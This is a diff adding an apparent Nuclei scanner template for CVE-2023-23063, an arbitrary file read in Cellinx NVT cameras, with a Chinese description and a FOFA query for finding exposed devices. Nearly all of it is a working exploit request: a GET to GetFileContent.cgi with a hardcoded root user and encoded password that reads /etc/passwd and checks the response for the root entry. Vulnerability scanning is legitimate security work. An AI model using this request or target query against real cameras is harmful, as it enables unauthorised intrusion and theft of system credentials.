@@ -1,0 +1,27 @@
+id: cellinx-nvt-camera-getfilecontentcgi-file-read
+
+info:
+  name: "Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="local/NVT-string.js"
+          Cellinx NVT v1.0.6.002b版本因对本地文件访问控制机制存在缺陷，导致攻击者可通过特定路径获取系统密码等敏感数据。
+  reference:
+  - CVE-2023-23063
+  tags: Cellinx
+
+http:
+- raw:
+  - |
+    GET /cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605 HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
